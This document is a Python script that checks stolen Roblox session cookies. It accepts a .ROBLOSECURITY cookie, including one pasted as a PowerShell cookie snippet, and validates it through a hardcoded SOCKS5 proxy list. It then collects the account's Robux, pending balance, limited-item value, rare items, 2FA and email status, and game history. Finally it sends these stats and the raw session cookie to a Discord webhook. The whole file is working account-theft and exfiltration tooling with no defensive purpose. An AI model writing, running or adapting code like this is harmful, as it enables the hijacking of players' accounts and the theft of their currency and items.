import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# --- Reduced Fast Proxy List ---
RAW_PROXY_LIST = """
socks5://192.111.130.5:17002
socks5://45.74.31.40:15662
socks5://47.238.128.246:18080
socks5://45.74.31.41:17812
socks5://8.220.136.174:1081
socks5://47.91.89.3:139
socks5://45.74.31.40:16595
socks5://45.74.31.47:7059
socks5://8.220.204.92:30001
socks5://45.74.31.41:15628
"""

SPECIAL_ASSETS = {
    "Korblox": 139607718,
    "Headless": 134082579,
    "Violet Valk": 1402432199,
}

GAMES = {
    "Adopt Me": 383310974,
    "MM2": 142823291,
    "PS99": 3259657279,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
        return None

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    
    cleaned = cookie.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 50:
        return None
        
    return cleaned

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=3)
            if test_res.status_code == 200:
                return session
        except Exception:
            continue

    session.proxies = {}
    return session

def main():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(sys.argv[1])
    if not raw_cookie:
        sys.exit(0)

    session = get_working_session(raw_cookie)

    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    username = auth_data.get("name", "Unknown")
    display_name = auth_data.get("displayName", username)

    def safe_get(url, params=None):
        try:
            r = session.get(url, params=params, timeout=5)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
    created = user_info.get("created", "")
    age_days = 0
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    robux = robux_res.get("robux", 0)

    trans_res = safe_get(
        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
        params={"transactionType": "summary", "timeFrame": "Year"}
    )
    pending = trans_res.get("pendingRobuxTotal", 0)

    limiteds = []
    cursor = ""
    page_count = 0
    while page_count < 2:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        r = safe_get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
            params=params
        )
        if not isinstance(r, dict):
            break
        for item in r.get("data", []):
            limiteds.append(item.get("recentAveragePrice", 0))
        cursor = r.get("nextPageCursor")
        page_count += 1
        if not cursor:
            break

    rap = sum(limiteds)
    lim_count = len(limiteds)

    try:
        prem_res = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            timeout=5
        )
        premium = prem_res.json() is True
    except Exception:
        premium = False

    def check_bundle(bundle_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    groups_res = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
    groups = groups_res.get("data", [])
    group_count = len(groups)
    owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)

    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)

    def check_played_and_passes(universe_id):
        played = False
        r = safe_get(
            f"https://badges.roblox.com/v1/users/{user_id}/badges",
            params={"limit": 100}
        )
        if isinstance(r, dict):
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    played = True
        return played, 0

    adopt_played, adopt_passes = check_played_and_passes(383310974)
    mm2_played, mm2_passes = check_played_and_passes(142823291)
    ps99_played, ps99_passes = check_played_and_passes(3259657279)

    avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

    payload = {
        "username": f"{username} | Stats",
        "avatar_url": avatar_url,
        "embeds": [
            {
                "title": f"🎮 {username} | Roblox Stats",
                "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
                    {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
                    {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
                    {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
                    {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
                    {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
                    {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
                    {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}`\n- MM2: `{mm2_played}`\n- PS99: `{ps99_played}`", "inline": False}
                ],
                "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            {
                "title": "🍪 Session Cookie Data",
                "description": f"```text\n{raw_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    main()
